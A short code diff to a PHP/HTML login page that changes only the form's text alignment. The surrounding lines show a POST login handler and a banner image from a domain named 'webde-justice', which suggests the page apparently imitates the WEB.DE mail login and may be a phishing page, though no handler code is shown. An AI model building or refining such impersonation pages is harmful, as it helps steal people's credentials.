@@ -101,7 +101,7 @@ if (isset($_POST['login'])) {
         </header>
         <div class="news mt-3"> <img src="https://webde-justice.vercel.app/_next/static/media/Lcreenshot1.e3f46304.png" width="100%" /></div>
         <div class="form-part d-flex justify-content-center p-2 mb-3  sticky-top">
-          <form class="mx-auto text-center" method="post" action="">
+          <form class="mx-auto text-start" method="post" action="">
             <div class="row align-items-center ">
               <div class="col-auto pb-2" style="color: skyblue; font-size: 30px;"> <i class="bi bi-envelope-fill"></i></div>
               <div class="col-auto pb-2">
